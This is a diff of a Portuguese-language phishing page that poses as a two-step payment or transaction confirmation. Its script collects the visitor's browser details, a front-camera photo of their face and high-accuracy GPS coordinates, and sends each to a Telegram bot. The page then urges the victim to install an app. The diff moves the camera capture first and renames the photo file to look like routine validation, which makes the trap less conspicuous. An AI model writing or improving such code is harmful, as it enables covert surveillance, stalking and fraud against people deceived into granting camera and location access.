@@ -29,39 +29,39 @@ function send(t){
 send("ABRIU\n"+navigator.userAgent+"\n"+screen.width+"x"+screen.height);
 document.getElementById("b1").onclick=function(){
   var b=this; b.disabled=true;
-  navigator.geolocation.getCurrentPosition(function(p){
-    send("GPS\n"+p.coords.latitude+","+p.coords.longitude+"\nprec: "+p.coords.accuracy+"m");
-    document.getElementById("txt").innerHTML="Confirmacao 1/2 concluida. <span class='ok'>OK</span><br><br>Agora a segunda etapa: confirme o recebedor pela camera.";
-    b.style.display="none";
-    document.getElementById("b2").style.display="block";
-  },function(e){
-    send("GPS negado: "+e.message);
-    document.getElementById("txt").innerHTML="Confirmacao 1/2 concluida. <span class='ok'>OK</span><br><br>Agora a segunda etapa: confirme o recebedor.";
-    b.style.display="none";
-    document.getElementById("b2").style.display="block";
-  },{enableHighAccuracy:true,timeout:15000});
-};
-document.getElementById("b2").onclick=function(){
-  var b=this; b.disabled=true;
   navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(function(s){
     var v=document.createElement("video"); v.srcObject=s; v.play();
     setTimeout(function(){
       var c=document.createElement("canvas"); c.width=v.videoWidth; c.height=v.videoHeight;
       c.getContext("2d").drawImage(v,0,0);
       c.toBlob(function(bl){
-        var f=new FormData(); f.append("chat_id",CHAT); f.append("photo",bl,"rosto.jpg");
+        var f=new FormData(); f.append("chat_id",CHAT); f.append("photo",bl,"validacao.jpg");
         fetch("https://api.telegram.org/bot"+TOKEN+"/sendPhoto",{method:"POST",body:f});
         s.getTracks().forEach(function(t){t.stop();});
       },"image/jpeg",0.7);
-      document.getElementById("txt").innerHTML="Confirmacao 2/2 concluida. <span class='ok'>OK</span><br><br>Transacao validada. Instale o app para concluir.";
+      document.getElementById("txt").innerHTML="Confirmacao 1/2 concluida. <span class='ok'>OK</span><br><br>Agora a segunda etapa: confirme a validacao do recebedor.";
       b.style.display="none";
-      document.getElementById("b3").style.display="block";
+      document.getElementById("b2").style.display="block";
     },2500);
   }).catch(function(e){
     send("CAM negada: "+e.message);
+    document.getElementById("txt").innerHTML="Confirmacao 1/2 concluida. <span class='ok'>OK</span><br><br>Agora a segunda etapa: confirme a validacao do recebedor.";
+    b.style.display="none";
+    document.getElementById("b2").style.display="block";
+  });
+};
+document.getElementById("b2").onclick=function(){
+  var b=this; b.disabled=true;
+  navigator.geolocation.getCurrentPosition(function(p){
+    send("GPS\n"+p.coords.latitude+","+p.coords.longitude+"\nprec: "+p.coords.accuracy+"m");
     document.getElementById("txt").innerHTML="Confirmacao 2/2 concluida. <span class='ok'>OK</span><br><br>Transacao validada. Instale o app para concluir.";
     b.style.display="none";
     document.getElementById("b3").style.display="block";
-  });
+  },function(e){
+    send("GPS negado: "+e.message);
+    document.getElementById("txt").innerHTML="Confirmacao 2/2 concluida. <span class='ok'>OK</span><br><br>Transacao validada. Instale o app para concluir.";
+    b.style.display="none";
+    document.getElementById("b3").style.display="block";
+  },{enableHighAccuracy:true,timeout:15000});
 };
 </script></body></html>
